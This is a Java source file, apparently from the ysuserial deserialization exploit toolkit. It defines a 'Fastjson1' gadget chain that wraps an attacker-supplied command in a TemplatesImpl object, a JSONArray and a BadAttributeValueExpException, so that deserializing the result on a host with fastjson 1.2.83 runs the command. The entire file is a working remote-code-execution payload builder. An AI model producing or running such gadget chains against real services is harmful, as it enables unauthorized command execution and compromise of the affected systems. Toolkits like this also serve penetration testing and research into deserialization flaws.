package org.su18.ysuserial.payloads.gadgets;

import com.alibaba.fastjson.JSONArray;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.PayloadRunner;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.math.BigInteger;
import java.util.HashMap;
import java.util.PriorityQueue;


@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:1.2.83"})
@Authors({Authors.Y4ER})
public class Fastjson1 implements ObjectPayload<Object> {
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Fastjson1.class, args);
	}

	public Object getObject(final String command) throws Exception {
		final Object template = Gadgets.createTemplatesImpl(command);
		JSONArray jsonArray = new JSONArray();
		jsonArray.add(template);

		BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
		Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);

		HashMap hashMap = new HashMap();
		hashMap.put(template, badAttributeValueExpException);

		return hashMap;
	}
}
